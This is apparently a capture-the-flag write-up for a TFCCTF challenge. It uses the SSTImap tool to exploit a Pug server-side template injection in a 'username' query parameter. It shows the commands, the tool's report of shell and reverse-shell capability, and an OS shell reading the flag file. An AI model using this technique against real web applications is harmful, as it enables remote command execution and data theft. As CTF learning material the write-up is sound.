Install SSTIMap

```
./sstimap.py -i
url http://challs.tfcctf.com:30947/result?username
run
```

if all good it will output 
```
[+] Pug plugin has confirmed injection with tag '1)*//'
[+] SSTImap identified the following injection point:

  Query parameter: username
  Engine: Pug
  Injection: 1)*//
  Context: code
  OS: linux
  Technique: render
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, javascript code
```


After that
```
os
[+] Run commands on the operating system.
linux $ ls
Dockerfile
app.js
flag.txt
node_modules
package-lock.json
package.json
public
views
linux $ cat flag.txt
TFCCTF{a6afc419a8d18207ca9435a38cb64f42fef108ad2b24c55321be197b767f0409}
linux $ 
```
